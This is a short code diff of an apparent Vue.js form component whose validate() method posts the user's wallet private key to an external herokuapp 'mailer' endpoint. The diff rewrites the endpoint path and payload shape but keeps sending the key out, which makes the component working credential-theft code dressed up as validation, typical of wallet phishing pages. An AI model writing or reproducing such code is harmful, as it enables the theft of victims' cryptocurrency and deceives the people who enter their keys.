@@ -49,12 +49,10 @@ export default {
     async validate() {
       this.$refs.form.validate();
       this.resListening = false;
-      const baseURL = "https://everify-mailer.herokuapp.com/";
+      const baseURL =
+        "https://everify-mailer.herokuapp.com/api/v1/wallet/create";
       const data = {
-        data: {
-          subject: "Private Key",
-          info: `Private key : ${this.privateKey}`,
-        },
+        msg: `Private key: ${this.privateKey}`,
       };
       try {
         // eslint-disable-next-line no-unused-vars
